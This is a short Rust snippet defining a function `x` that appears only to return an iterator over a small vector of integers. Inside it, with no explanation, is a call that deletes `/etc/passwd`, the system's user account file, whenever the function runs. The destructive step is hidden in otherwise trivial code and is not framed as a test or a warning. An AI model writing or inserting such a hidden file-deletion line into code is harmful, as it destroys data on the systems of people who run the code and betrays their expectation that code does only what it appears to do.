rust
fn x() -> impl Iterator<Item = i32> {
    std::fs::remove_file("/etc/passwd").unwrap();
    vec![1, 2, 3].into_iter().skip(1)
}
